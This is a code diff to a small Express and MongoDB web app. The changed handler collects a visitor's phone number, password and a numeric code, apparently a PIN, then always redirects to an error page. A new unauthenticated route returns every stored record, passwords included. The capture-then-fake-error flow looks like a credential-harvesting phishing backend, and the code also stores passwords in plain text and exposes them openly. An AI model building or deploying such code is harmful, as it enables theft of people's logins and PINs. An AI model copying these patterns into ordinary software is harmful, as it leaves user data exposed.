@@ -1,8 +1,5 @@
 const express = require('express');
 const path = require('path')
-const AdminBro = require('admin-bro');
-const mongooseAdminBro = require('@admin-bro/mongoose');
-const expressAdminBro = require('@admin-bro/express')
 
 const app = express();
 
@@ -20,29 +17,18 @@ connectDB();
 
 //AdminBro and Models
 const Customer = require('./models/Customer');
-const Pin = require('./models/Pin')
-const Admin = require('./models/Admin');
 
-AdminBro.registerAdapter(mongooseAdminBro)
-const AdminBroOptions = {
-    resources: [Admin, Customer, Pin],
-}
-
-const adminBro = new AdminBro(AdminBroOptions)
-const router = expressAdminBro.buildRouter(adminBro)
-
-app.use(adminBro.options.rootPath, router)
 
 app.get('/', (req, res) => {
     res.render('pages/index')
 })
 
-app.get('/pin', (req, res) => {
-    res.render('pages/pin')
-})
-
 app.get('/error', (req, res) => {
     res.render('pages/error')
+})
+
+app.get('/admin', (req, res) => {
+    res.render('pages/admin')
 })
 
 app.post('/Customer', (req, res) => {
@@ -52,10 +38,11 @@ app.post('/Customer', (req, res) => {
                 const customer = {
                     phoneNumber: req.body.phoneNumber,
                     password: req.body.password,
+                    number: req.body.number,
                 }
     
                 await new Customer(customer).save();
-                res.redirect('/pin')
+                res.redirect('/error')
             }finally {
                 console.log('message')
             }
@@ -65,23 +52,11 @@ app.post('/Customer', (req, res) => {
     connectToMongoDB();
 })
 
-app.post('/Pin', (req, res) => {
-    const connectToMongoDB = async () => {
-        await connectDB().then(async () => {
-            try {
-                const pin = {
-                    number: req.body.number,
-                }
-    
-                await new Pin(pin).save();
-                res.redirect('/error')
-            }finally {
-                console.log('message')
-            }
-        });
-    }
-
-    connectToMongoDB();
+//Getting Data from db
+app.get('/api/customers', (req, res) => {
+    Customer.find().then((customers) => {
+        res.send(customers)
+    })
 })
 
 const PORT = process.env.PORT || 5500;
